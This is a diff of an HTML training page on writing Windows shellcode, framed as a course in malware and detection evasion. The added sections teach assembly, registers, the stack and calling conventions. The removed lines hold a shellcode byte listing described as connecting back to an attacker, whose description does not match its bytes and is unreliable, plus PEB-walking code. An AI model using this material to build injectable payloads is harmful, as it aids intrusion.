@@ -6,9 +6,26 @@
     <title>MODULE 05: SHELLCODE — 22ND SURVEY DIVISION</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Inter:wght@400;600;800&display=swap');
-        :root { --bg: #050505; --fg: #c0c0c0; --accent: #ff0040; --accent2: #00ff41; --dim: #444; --border: #1a1a1a; --neon: #00ffff; }
+        :root {
+            --bg: #050505;
+            --fg: #c0c0c0;
+            --accent: #ff0040;
+            --accent2: #00ff41;
+            --dim: #444;
+            --border: #1a1a1a;
+            --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
+        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: var(--bg); color: var(--fg); font-family: 'Inter', sans-serif; line-height: 1.7; background-image: linear-gradient(rgba(255,0,64,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,64,0.03) 1px, transparent 1px); background-size: 50px 50px; }
+        body {
+            background: var(--bg);
+            color: var(--fg);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.7;
+            background-image: linear-gradient(rgba(255,0,64,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,64,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+        }
         .container { max-width: 900px; margin: 0 auto; padding: 3rem 2rem; }
         .module-header { border: 3px solid var(--accent); padding: 2rem; margin-bottom: 3rem; position: relative; }
         .module-header::before { content: 'CLASSIFIED'; position: absolute; top: -12px; left: 20px; background: var(--bg); color: var(--accent); font-family: 'Space Mono', monospace; font-size: 0.7rem; padding: 0 10px; letter-spacing: 0.2em; }
@@ -34,25 +51,180 @@
         .soldier-box { border: 2px solid #ffaa00; padding: 1.5rem; margin: 1.5rem 0; position: relative; }
         .soldier-box::before { content: 'SOLDIER TRANSLATION'; position: absolute; top: -14px; left: 20px; background: var(--bg); color: #ffaa00; font-family: 'Space Mono', monospace; font-size: 0.7rem; padding: 0 10px; letter-spacing: 0.2em; }
         .soldier-box p { font-style: italic; color: #ccc; }
-        .code-block { background: #000; border: 1px solid #333; border-left: 4px solid var(--accent); padding: 1.5rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Space Mono', monospace; font-size: 0.85rem; line-height: 1.6; color: #00ff41; }
+        .code-block {
+            background: #000;
+            border: 1px solid #333;
+            border-left: 4px solid var(--accent);
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            overflow-x: auto;
+            font-family: 'Space Mono', monospace;
+            font-size: 0.85rem;
+            line-height: 1.6;
+            color: #00ff41;
+            position: relative;
+        }
         .code-block .comment { color: #666; }
         .code-block .prompt { color: var(--accent); }
         .code-block .output { color: var(--fg); }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-family: 'Space Mono', monospace;
+            font-size: 0.7rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box { border: 3px solid var(--accent); padding: 2rem; margin: 2rem 0; position: relative; }
         .evidence-box::before { content: 'EVIDENCE'; position: absolute; top: -14px; left: 20px; background: var(--bg); color: var(--accent); font-family: 'Space Mono', monospace; font-size: 0.7rem; padding: 0 10px; letter-spacing: 0.2em; }
         .evidence-meta { font-family: 'Space Mono', monospace; font-size: 0.75rem; color: var(--dim); margin-bottom: 1rem; border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; }
-        .copy-paste { background: #0a0a0a; border: 1px solid #333; border-left: 4px solid var(--neon); padding: 1rem 1.5rem; font-family: 'Space Mono', monospace; font-size: 0.85rem; color: var(--neon); margin: 1rem 0; cursor: pointer; transition: all 0.2s; }
+        .copy-paste {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-left: 4px solid var(--neon);
+            padding: 1rem 1.5rem;
+            font-family: 'Space Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--neon);
+            margin: 1rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+            position: relative;
+        }
         .copy-paste:hover { background: #1a1a1a; border-color: var(--neon); }
         .why-box { border-left: 4px solid #ffaa00; padding: 1rem 1.5rem; margin: 1rem 0; background: #0a0a0a; }
         .why-box h5 { font-family: 'Space Mono', monospace; color: #ffaa00; margin-bottom: 0.5rem; text-transform: uppercase; font-size: 0.85rem; }
         .warning-box { border: 2px solid #ff0040; padding: 1.5rem; margin: 1.5rem 0; background: #1a0005; }
         .warning-box h5 { font-family: 'Space Mono', monospace; color: #ff0040; margin-bottom: 0.5rem; text-transform: uppercase; }
+        .first-principle {
+            background: #0a1a0a;
+            border: 2px solid var(--accent2);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .first-principle h3 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .layman-term {
+            background: #1a1a1a;
+            border: 1px dashed var(--dim);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 8px;
+        }
+        .layman-term h4 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover { border-color: var(--accent); }
+        .method-card h4 { color: var(--accent); margin-bottom: 0.5rem; font-size: 1.1rem; }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover { border-color: var(--neon); background: #1a1a3e; }
+        .quiz-option.correct { border-color: var(--accent2); background: #0a2a0a; }
+        .quiz-option.wrong { border-color: var(--accent); background: #2a0a0a; }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover { background: rgba(0, 255, 255, 0.2); }
+        .step-box {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        .step-box h4 { color: var(--accent); margin-bottom: 0.5rem; }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
         ol, ul { margin-left: 1.5rem; line-height: 2; }
         li { margin: 0.5rem 0; }
-        button { background: transparent; color: var(--accent); border: 2px solid var(--accent); padding: 0.8rem 2rem; font-family: 'Space Mono', monospace; font-size: 0.85rem; cursor: pointer; text-transform: uppercase; letter-spacing: 0.1em; transition: all 0.2s; }
+        button {
+            background: transparent;
+            color: var(--accent);
+            border: 2px solid var(--accent);
+            padding: 0.8rem 2rem;
+            font-family: 'Space Mono', monospace;
+            font-size: 0.85rem;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            transition: all 0.2s;
+        }
         button:hover { background: var(--accent); color: var(--bg); }
         table { width: 100%; border-collapse: collapse; margin: 1rem 0; font-family: 'Space Mono', monospace; font-size: 0.85rem; }
         td { padding: 0.8rem; border-bottom: 1px solid var(--border); }
+        th { padding: 0.8rem; border-bottom: 1px solid var(--border); text-align: left; color: var(--neon); font-weight: bold; }
         hr { border: none; border-top: 2px solid var(--border); margin: 3rem 0; }
         @media (max-width: 768px) { .container { padding: 1.5rem; } .module-header h1 { font-size: 1.5rem; } .nav { flex-direction: column; } .nav a { border-right: none; border-bottom: 2px solid var(--border); } }
     </style>
@@ -79,179 +251,1002 @@
         </div>
 
         <div class="core-truth">
-            <p>Shellcode is not a program. It's a parasite. It doesn't have a window, a menu, or a file. It exists only in memory, injected into another process, and executes invisibly. The smaller it is, the harder it is to detect. The simpler it is, the more reliable it is. This module teaches you to write, encode, inject, and execute shellcode — the purest form of malware.</p>
+            <p>Shellcode is not a program. It's a parasite. It doesn't have a window, a menu, or a file. It exists only in memory, injected into another process, and executes invisibly. The smaller it is, the harder it is to detect. The simpler it is, the more reliable it is. This module teaches you to write, encode, inject, and execute shellcode — the purest form of malware. You will learn assembly from the ground up, master the stack and registers, walk the PEB to find APIs dynamically, encode payloads to evade detection, and build custom position-independent code that works on any Windows system.</p>
         </div>
 
         <div class="soldier-box">
-            <p>Imagine a soldier who doesn't wear a uniform, doesn't carry a weapon, and doesn't exist on any roster. He slips into an enemy unit, wears their uniform, speaks their language, and waits. When the time comes, he acts — and disappears. That's shellcode. Not a program, but a presence inside a program.</p>
+            <p>Imagine a soldier who doesn't wear a uniform, doesn't carry a weapon, and doesn't exist on any roster. He slips into an enemy unit, wears their uniform, speaks their language, and waits. When the time comes, he acts — and disappears. That's shellcode. Not a program, but a presence inside a program. He doesn't bring his own tools; he uses the enemy's. He doesn't ask for permission; he takes what he needs from the environment. This module teaches you to become that soldier at the machine-code level.</p>
+        </div>
+
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_06_MEMORY.html" class="cross-link">Module 06: Memory</a></h4>
+                <p>Virtual memory layout, heap vs stack, memory protection flags (PAGE_EXECUTE_READWRITE), and how shellcode lives in memory without a file on disk.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_09_MALWARE.html" class="cross-link">Module 09: Malware</a></h4>
+                <p>Payload design, evasion techniques, packers, and how shellcode fits into the broader malware development lifecycle.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                <p>Process injection, remote threads, APC injection, and how shellcode is delivered into target processes using Windows APIs.</p>
+            </div>
         </div>
 
         <hr>
 
+        <!-- SECTION 01: ASSEMBLY BASICS -->
         <div class="section">
             <span class="section-number">SECTION 01</span>
-            <h2>What is Shellcode?</h2>
-            <p>Shellcode is machine code — binary instructions that the CPU executes directly. No compiler, no linker, no operating system loader. Just raw bytes fed into memory and jumped to. The name comes from its original purpose: opening a shell (command prompt) for the attacker.</p>
+            <h2>Assembly Basics: Speaking to the CPU</h2>
+            <p>Shellcode is machine code — binary instructions that the CPU executes directly. No compiler, no linker, no operating system loader. Just raw bytes fed into memory and jumped to. To write shellcode, you must first understand assembly: the human-readable representation of machine code. Every instruction maps to one or more bytes. Every byte is an order given directly to the CPU.</p>
+
+            <div class="soldier-box">
+                <p>Assembly is like giving orders in the enemy's language. You don't ask the OS to do something; you tell the CPU directly. No interpreter, no middleman. Every command is a single machine instruction: move this value, add these numbers, jump to that address. If you get one byte wrong, the CPU crashes or executes garbage. Precision is everything.</p>
+            </div>
+
+            <h3>1.1 What is Assembly?</h3>
+            <p>Assembly language is a symbolic representation of a processor's machine code. Each assembly instruction corresponds to exactly one machine instruction (on RISC architectures) or a small sequence (on CISC like x86). The assembler (NASM, MASM, GAS) converts these human-readable mnemonics into the binary opcodes the CPU understands.</p>
 
             <div class="code-block">
-<span class="comment">// Classic Windows shellcode: spawn cmd.exe</span>
-<span class="comment">// This is x86 (32-bit) assembly, encoded as hex bytes</span>
+<span class="comment">; Assembly → Machine Code → CPU Execution</span>
+<span class="comment">; Each line becomes 1-15 bytes of raw binary</span>
 
-<span class="prompt">SHELLCODE:</span>
-<span class="output">\x31\xc0\x50\x68\x63\x61\x6c\x63\x54\x5b\x50\x53\xb9</span>
-<span class="output">\xc7\x93\xc2\x77\xff\xd1\x31\xc0\x50\xbb\xda\xcd\x81</span>
-<span class="output">\x7c\xff\xd3\x31\xc0\x50\x53\xbb\x4a\x86\x8c\x7c\xff</span>
-<span class="output">\xd3\x31\xc0\x50\xb8\x11\x11\x11\x11\xbb\x22\x22\x22</span>
-<span class="output">\x22\x31\xc3\x53\x50\xbb\xa6\xba\x9d\x77\xff\xd3</span>
-
-<span class="comment">// 44 bytes. Opens cmd.exe, connects back to attacker.</span>
-<span class="comment">// No file on disk. No process name. Just memory.</span>
+<span class="output">mov eax, 1          ; B8 01 00 00 00    (5 bytes on x86)</span>
+<span class="output">add eax, ebx        ; 01 D8               (2 bytes)</span>
+<span class="output">jmp short label     ; EB 05               (2 bytes, relative)</span>
+<span class="output">call eax            ; FF D0               (2 bytes)</span>
             </div>
+
+            <h3>1.2 Instruction Format</h3>
+            <p>x86 instructions follow a variable-length format: <span class="neon-highlight">[Prefixes] + [Opcode] + [ModR/M] + [SIB] + [Displacement] + [Immediate]</span>. Not all fields are present in every instruction. Understanding this helps you predict instruction sizes and avoid null bytes.</p>
+
+            <table>
+                <tr><th>Field</th><th>Size</th><th>Purpose</th></tr>
+                <tr><td>Prefixes</td><td>0-4 bytes</td><td>Lock, repeat, segment override, operand-size override</td></tr>
+                <tr><td>Opcode</td><td>1-3 bytes</td><td>The actual operation (mov, add, jmp, etc.)</td></tr>
+                <tr><td>ModR/M</td><td>0-1 byte</td><td>Register/memory addressing mode</td></tr>
+                <tr><td>SIB</td><td>0-1 byte</td><td>Scale-Index-Base for complex addressing</td></tr>
+                <tr><td>Displacement</td><td>0-4 bytes</td><td>Memory offset</td></tr>
+                <tr><td>Immediate</td><td>0-4 bytes</td><td>Constant value operand</td></tr>
+            </table>
 
             <div class="why-box">
-                <h5>Why shellcode is powerful</h5>
-                <p>Antivirus scans files. Firewalls monitor network connections. But shellcode exists only in memory, inside a legitimate process like Notepad or Explorer. It has no file signature, no network footprint during injection, and no process of its own. It is invisible to most detection methods.</p>
+                <h5>Why instruction size matters</h5>
+                <p>Shellcode size is critical. Every byte must be injected, and smaller payloads evade size-based heuristics. A <span class="neon-highlight">mov eax, 0</span> encoded as <span class="neon-highlight">B8 00 00 00 00</span> is 5 bytes with nulls. The same operation as <span class="neon-highlight">xor eax, eax</span> (31 C0) is 2 bytes, null-free. Shellcode authors obsess over every byte.</p>
             </div>
+
+            <h3>1.3 Common Instructions for Shellcode</h3>
+            <table>
+                <tr><th>Instruction</th><th>Description</th><th>Example Use</th></tr>
+                <tr><td><span class="neon-highlight">mov</span></td><td>Move data between registers/memory</td><td>mov eax, ebx — copy register value</td></tr>
+                <tr><td><span class="neon-highlight">push / pop</span></td><td>Stack operations</td><td>push eax — save register; pop eax — restore</td></tr>
+                <tr><td><span class="neon-highlight">xor</span></td><td>Bitwise XOR (used to zero registers)</td><td>xor eax, eax — zero eax without nulls</td></tr>
+                <tr><td><span class="neon-highlight">add / sub</span></td><td>Arithmetic</td><td>add esp, 0x20 — clean stack</td></tr>
+                <tr><td><span class="neon-highlight">call / ret</span></td><td>Function call and return</td><td>call eax — call API via register</td></tr>
+                <tr><td><span class="neon-highlight">jmp</span></td><td>Unconditional jump</td><td>jmp short forward — skip data</td></tr>
+                <tr><td><span class="neon-highlight">cmp / test</span></td><td>Compare and test (set flags)</td><td>cmp eax, 0 — check return value</td></tr>
+                <tr><td><span class="neon-highlight">jz / jnz</span></td><td>Jump if zero / not zero</td><td>jz error_handler — branch on failure</td></tr>
+                <tr><td><span class="neon-highlight">lea</span></td><td>Load effective address</td><td>lea eax, [esp+4] — get pointer</td></tr>
+                <tr><td><span class="neon-highlight">nop</span></td><td>No operation (0x90)</td><td>nop sleds, alignment padding</td></tr>
+            </table>
         </div>
 
+        <!-- SECTION 02: REGISTERS -->
         <div class="section">
             <span class="section-number">SECTION 02</span>
-            <h2>Writing Shellcode</h2>
-            <p>Shellcode is written in assembly, assembled into machine code, and extracted as hex bytes. The process is manual, error-prone, and requires understanding of calling conventions, API addresses, and memory layout.</p>
+            <h2>x86/x64 Registers: The CPU's Workspace</h2>
+            <p>Registers are the CPU's fastest, smallest storage. They hold data being processed, memory addresses, and status flags. Shellcode lives and dies by register management. You have no variables, no stack frame helpers — just registers and memory.</p>
+
+            <h3>2.1 General-Purpose Registers (x86)</h3>
+            <table>
+                <tr><th>Register</th><th>Full (32-bit)</th><th>Low 16</th><th>Low 8</th><th>High 8</th><th>Typical Use</th></tr>
+                <tr><td><span class="neon-highlight">EAX</span></td><td>EAX</td><td>AX</td><td>AL</td><td>AH</td><td>Accumulator, return values, arithmetic</td></tr>
+                <tr><td><span class="neon-highlight">EBX</span></td><td>EBX</td><td>BX</td><td>BL</td><td>BH</td><td>Base register, often holds pointers</td></tr>
+                <tr><td><span class="neon-highlight">ECX</span></td><td>ECX</td><td>CX</td><td>CL</td><td>CH</td><td>Counter, loop iterations, string ops</td></tr>
+                <tr><td><span class="neon-highlight">EDX</span></td><td>EDX</td><td>DX</td><td>DL</td><td>DH</td><td>Data, I/O operations, multiply/divide</td></tr>
+                <tr><td><span class="neon-highlight">ESI</span></td><td>ESI</td><td>SI</td><td>SIL*</td><td>—</td><td>Source index, string source pointer</td></tr>
+                <tr><td><span class="neon-highlight">EDI</span></td><td>EDI</td><td>DI</td><td>DIL*</td><td>—</td><td>Destination index, string destination</td></tr>
+                <tr><td><span class="neon-highlight">EBP</span></td><td>EBP</td><td>BP</td><td>BPL*</td><td>—</td><td>Base pointer, stack frame reference</td></tr>
+                <tr><td><span class="neon-highlight">ESP</span></td><td>ESP</td><td>SP</td><td>SPL*</td><td>—</td><td>Stack pointer, top of stack</td></tr>
+            </table>
+            <p style="font-size:0.8rem; color:var(--dim);">* Low 8-bit aliases require REX prefix on x64; not available on x86.</p>
+
+            <h3>2.2 Special-Purpose Registers</h3>
+            <table>
+                <tr><th>Register</th><th>Purpose</th><th>Shellcode Relevance</th></tr>
+                <tr><td><span class="neon-highlight">EIP / RIP</span></td><td>Instruction pointer — address of next instruction</td><td>Cannot be directly modified; controlled via jmp/call/ret</td></tr>
+                <tr><td><span class="neon-highlight">EFLAGS</span></td><td>Status flags (zero, carry, sign, overflow, etc.)</td><td>Conditional jumps depend on these flags</td></tr>
+                <tr><td><span class="neon-highlight">FS (x86) / GS (x64)</span></td><td>Segment register pointing to TEB/PEB</td><td>FS:[0x30] = PEB on x86; GS:[0x60] = PEB on x64</td></tr>
+            </table>
+
+            <h3>2.3 x64 Register Extensions</h3>
+            <p>x64 adds 8 new general-purpose registers (R8-R15) and extends all 32-bit registers to 64-bit (RAX, RBX, RCX, etc.). Calling conventions differ: the first four integer arguments are passed in RCX, RDX, R8, R9 instead of the stack. This changes shellcode design significantly.</p>
 
             <div class="code-block">
-<span class="comment">// Step 1: Write assembly</span>
-<span class="comment">// spawn_calc.asm — opens calculator (safe for testing)</span>
+<span class="comment">; x86: arguments pushed onto stack</span>
+<span class="output">push 0                    ; uCmdShow</span>
+<span class="output">push ebx                  ; lpCmdLine</span>
+<span class="output">call WinExec              ; Stack-based calling</span>
 
-<span class="output">; nasm -f win32 spawn_calc.asm -o spawn_calc.obj</span>
-<span class="output">; objdump -d spawn_calc.obj | grep '^ ' | cut -f2 | tr -d ' ' | tr -d '\n'</span>
-
-<span class="output">section .text</span>
-<span class="output">global _start</span>
-
-<span class="output">_start:</span>
-<span class="output">    xor eax, eax            ; Clear eax</span>
-<span class="output">    push eax                ; Null terminator</span>
-<span class="output">    push 0x6578652e         ; "exe"</span>
-<span class="output">    push 0x636c6163         ; "calc"</span>
-<span class="output">    mov ebx, esp            ; Pointer to "calc.exe"</span>
-<span class="output">    push eax                ; lpParameters = NULL</span>
-<span class="output">    push ebx                ; lpFile = "calc.exe"</span>
-<span class="output">    push eax                ; lpOperation = NULL</span>
-<span class="output">    push eax                ; hwnd = NULL</span>
-<span class="output">    mov eax, 0x7c8623ad     ; ShellExecuteA address (XP SP3)</span>
-<span class="output">    call eax                ; Execute</span>
-            </div>
-
-            <div class="copy-paste">
-# Assemble and extract shellcode
-nasm -f win32 spawn_calc.asm -o spawn_calc.obj
-objdump -d spawn_calc.obj | grep '^ ' | cut -f2 | tr -d ' ' | tr -d '\n'
-
-# Output (hex bytes):
-# 31c050682e6578656863616c636389e350535050b8ad236287ffd0
-
-# Convert to C array:
-echo "unsigned char shellcode[] = {"
-echo "0x31, 0xc0, 0x50, 0x68, 0x2e, 0x65, 0x78, 0x65,"
-echo "0x68, 0x63, 0x61, 0x6c, 0x63, 0x89, 0xe3, 0x50,"
-echo "0x53, 0x50, 0x50, 0xb8, 0xad, 0x23, 0x62, 0x87,"
-echo "0xff, 0xd0"
-echo "};"
+<span class="comment">; x64: arguments in registers</span>
+<span class="output">mov rcx, rbx              ; lpCmdLine (1st arg)</span>
+<span class="output">mov rdx, 1                ; uCmdShow (2nd arg)</span>
+<span class="output">call WinExec              ; Register-based calling</span>
             </div>
 
             <div class="warning-box">
-                <h5>⚠ Address dependency</h5>
-                <p>The ShellExecuteA address (0x7c8623ad) is hardcoded for Windows XP SP3. On Windows 10, this address is different and changes every reboot due to ASLR (Address Space Layout Randomization). This is why modern shellcode uses dynamic API resolution — finding the address at runtime instead of hardcoding it.</p>
+                <h5>⚠ Register Preservation Rules</h5>
+                <p>In both x86 and x64, certain registers must be preserved across function calls: <span class="neon-amber">EBX/RBX, ESI/RSI, EDI/RDI, EBP/RBP</span>. If your shellcode modifies these, you must save and restore them. <span class="neon-highlight">EAX/RAX, ECX/RCX, EDX/RDX</span> are scratch registers — functions can overwrite them freely. Violating these rules crashes the host process.</p>
             </div>
         </div>
 
+        <!-- SECTION 03: THE STACK -->
         <div class="section">
             <span class="section-number">SECTION 03</span>
-            <h2>Dynamic API Resolution</h2>
-            <p>Modern Windows randomizes DLL base addresses. Hardcoded addresses fail. The solution: find APIs at runtime by walking the Process Environment Block (PEB) and parsing export tables.</p>
+            <h2>The Stack: LIFO Memory for Function Calls</h2>
+            <p>The stack is a region of memory that grows downward (from high addresses to low addresses). It is used for temporary storage, function call frames, local variables, and return addresses. Understanding the stack is non-negotiable for shellcode — every function call manipulates it, and buffer overflows (which inject shellcode) target it.</p>
+
+            <div class="soldier-box">
+                <p>The stack is like a pile of papers on a desk. You can only add or remove from the top. When you call a function, you put the return address on top. When the function finishes, it reads that address and jumps back. If an attacker overflows a buffer and overwrites the return address, they control where the CPU goes next. That's the foundation of stack-based exploitation.</p>
+            </div>
+
+            <h3>3.1 Stack Operations</h3>
+            <div class="code-block">
+<span class="comment">; Stack grows DOWNWARD (toward lower addresses)</span>
+<span class="comment">; ESP always points to the top of the stack</span>
+
+<span class="output">push eax          ; ESP -= 4; [ESP] = EAX</span>
+<span class="output">pop ebx           ; EBX = [ESP]; ESP += 4</span>
+<span class="output">push 0x12345678   ; ESP -= 4; [ESP] = 0x12345678</span>
+
+<span class="comment">; Stack frame setup (function prologue)</span>
+<span class="output">push ebp          ; Save old base pointer</span>
+<span class="output">mov ebp, esp      ; Set new base pointer</span>
+<span class="output">sub esp, 0x20     ; Allocate 32 bytes for locals</span>
+
+<span class="comment">; Stack frame teardown (function epilogue)</span>
+<span class="output">mov esp, ebp      ; Deallocate locals</span>
+<span class="output">pop ebp           ; Restore old base pointer</span>
+<span class="output">ret               ; Pop return address into EIP</span>
+            </div>
+
+            <h3>3.2 Stack Layout During Function Call</h3>
+            <div class="code-block">
+<span class="comment">; Before call:</span>
+<span class="output">; [ESP+8]  = argument 2</span>
+<span class="output">; [ESP+4]  = argument 1</span>
+<span class="output">; [ESP]    = return address (pushed by CALL instruction)</span>
+<span class="output">; [ESP-4]  = saved EBP (pushed by function prologue)</span>
+<span class="output">; [ESP-8]  = local variable 1</span>
+<span class="output">; [ESP-C]  = local variable 2</span>
+            </div>
+
+            <h3>3.3 Stack Alignment (x64)</h3>
+            <p>x64 requires the stack to be 16-byte aligned before a CALL instruction. Misaligned stacks cause crashes in SSE-optimized functions. Shellcode must manually align the stack or use APIs that don't enforce alignment.</p>
 
             <div class="code-block">
-<span class="comment">// Dynamic API resolution — finds LoadLibraryA and GetProcAddress</span>
-<span class="comment">// Then uses them to find any other API</span>
+<span class="comment">; Align RSP to 16-byte boundary before calling an API</span>
+<span class="output">and rsp, 0xFFFFFFFFFFFFFFF0   ; Clear low 4 bits</span>
+<span class="output">sub rsp, 0x28                 ; Shadow space (32 bytes) + alignment</span>
+<span class="output">call SomeApi</span>
+<span class="output">add rsp, 0x28                 ; Clean up shadow space</span>
+            </div>
+        </div>
 
-<span class="output">; Find kernel32.dll base from PEB</span>
-<span class="output">mov eax, fs:[0x30]      ; PEB pointer</span>
-<span class="output">mov eax, [eax + 0x0C]   ; PEB->Ldr</span>
-<span class="output">mov eax, [eax + 0x14]   ; InMemoryOrderModuleList</span>
-<span class="output">mov eax, [eax]          ; First module (ntdll)</span>
-<span class="output">mov eax, [eax]          ; Second module (kernel32)</span>
-<span class="output">mov ebx, [eax + 0x10]   ; kernel32.dll base address</span>
+        <!-- SECTION 04: CALLING CONVENTIONS -->
+        <div class="section">
+            <span class="section-number">SECTION 04</span>
+            <h2>Calling Conventions: The Rules of Engagement</h2>
+            <p>A calling convention defines how functions receive arguments, return values, and who cleans up the stack. Windows uses different conventions for different architectures and API types. Shellcode must obey these rules or the host process crashes.</p>
 
-<span class="comment">// This works on every Windows version because the PEB structure</span>
-<span class="comment">// is stable and documented. No hardcoded addresses.</span>
+            <h3>4.1 stdcall (Windows APIs, 32-bit)</h3>
+            <p>Arguments pushed right-to-left. Callee cleans the stack. Return value in EAX. This is the convention for most Windows APIs (kernel32.dll, user32.dll, etc.).</p>
+
+            <div class="code-block">
+<span class="comment">; stdcall: MessageBoxA(HWND, LPCSTR, LPCSTR, UINT)</span>
+<span class="output">push 0                    ; uType = MB_OK</span>
+<span class="output">push title_string         ; lpCaption</span>
+<span class="output">push message_string       ; lpText</span>
+<span class="output">push 0                    ; hWnd = NULL</span>
+<span class="output">call MessageBoxA          ; Arguments: 4 * 4 = 16 bytes</span>
+<span class="comment">; MessageBoxA itself does: ret 0x10 (cleans stack)</span>
+            </div>
+
+            <h3>4.2 cdecl (C runtime, 32-bit)</h3>
+            <p>Arguments pushed right-to-left. Caller cleans the stack. Used by C runtime functions like printf, malloc.</p>
+
+            <div class="code-block">
+<span class="comment">; cdecl: printf(const char* format, ...)</span>
+<span class="output">push value                ; argument</span>
+<span class="output">push format_string        ; format</span>
+<span class="output">call printf</span>
+<span class="output">add esp, 8                ; Caller cleans: 2 args * 4 bytes</span>
+            </div>
+
+            <h3>4.3 fastcall</h3>
+            <p>First two arguments in ECX and EDX. Remaining arguments on stack. Callee cleans stack. Rare in Windows APIs but used in some internal functions.</p>
+
+            <h3>4.4 x64 Calling Convention (Microsoft)</h3>
+            <p>First four integer/pointer arguments in RCX, RDX, R8, R9. Additional arguments on stack. Caller allocates 32 bytes of "shadow space" on stack before call. Stack must be 16-byte aligned.</p>
+
+            <div class="code-block">
+<span class="comment">; x64: MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span>
+<span class="output">sub rsp, 0x28             ; Shadow space + alignment</span>
+<span class="output">xor r9d, r9d              ; uType = 0 (4th arg)</span>
+<span class="output">lea r8, [caption]         ; lpCaption (3rd arg)</span>
+<span class="output">lea rdx, [message]        ; lpText (2nd arg)</span>
+<span class="output">xor ecx, ecx              ; hWnd = NULL (1st arg)</span>
+<span class="output">call MessageBoxA</span>
+<span class="output">add rsp, 0x28             ; Restore stack</span>
+            </div>
+
+            <table>
+                <tr><th>Convention</th><th>Args</th><th>Stack Cleanup</th><th>Where Used</th></tr>
+                <tr><td><span class="neon-highlight">stdcall</span></td><td>Stack (right-to-left)</td><td>Callee (ret n)</td><td>Most Windows APIs (32-bit)</td></tr>
+                <tr><td><span class="neon-highlight">cdecl</span></td><td>Stack (right-to-left)</td><td>Caller (add esp, n)</td><td>C runtime functions</td></tr>
+                <tr><td><span class="neon-highlight">fastcall</span></td><td>ECX, EDX, then stack</td><td>Callee</td><td>Some internal MS functions</td></tr>
+                <tr><td><span class="neon-highlight">x64 MS</span></td><td>RCX, RDX, R8, R9, then stack</td><td>Caller</td><td>All Windows APIs (64-bit)</td></tr>
+            </table>
+        </div>
+
+        <!-- SECTION 05: POSITION-INDEPENDENT CODE -->
+        <div class="section">
+            <span class="section-number">SECTION 05</span>
+            <h2>Position-Independent Code (PIC)</h2>
+            <p>Shellcode has no fixed address. It might be injected at 0x10000000 in one process and 0x7F000000 in another. It cannot contain hardcoded absolute addresses for data or code. Position-Independent Code (PIC) solves this by computing addresses relative to the current instruction pointer.</p>
+
+            <div class="soldier-box">
+                <p>PIC is like a soldier who doesn't know which building he's in, but he knows the layout is always the same. He measures distances from where he stands, not from a fixed landmark. If he's in the kitchen, the armory is always three doors to the left — regardless of which building he's in. Shellcode uses the same principle: everything is relative to the instruction pointer (EIP/RIP).</p>
+            </div>
+
